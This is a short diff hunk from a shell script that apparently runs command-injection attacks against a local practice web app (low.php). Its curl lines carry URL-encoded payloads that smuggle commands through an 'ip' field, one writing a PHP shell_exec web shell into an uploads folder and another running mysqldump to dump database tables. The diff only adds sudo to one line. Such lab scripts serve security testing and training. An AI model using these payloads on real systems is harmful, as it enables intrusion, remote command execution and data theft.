@@ -123,7 +123,7 @@ sudo curl -X POST -d "ip=1.1.1.1+%26%26+echo+%27%3C%3Fphp+shell_exec%28%22whoami
 sudo curl http://localhost/uploads/test.php
 
 header "Executing Command Injection to dump MySQL Server tables." | tee -a $INFO
-curl -X POST -d "ip=1.1.1.1+%26%26+mysqldump+-u&Submit=Submit" http://localhost/low.php
+sudo curl -X POST -d "ip=1.1.1.1+%26%26+mysqldump+-u&Submit=Submit" http://localhost/low.php
 
 header "Cleanup of $output_file" | tee -a $INFO
 sudo rm -f $output_file
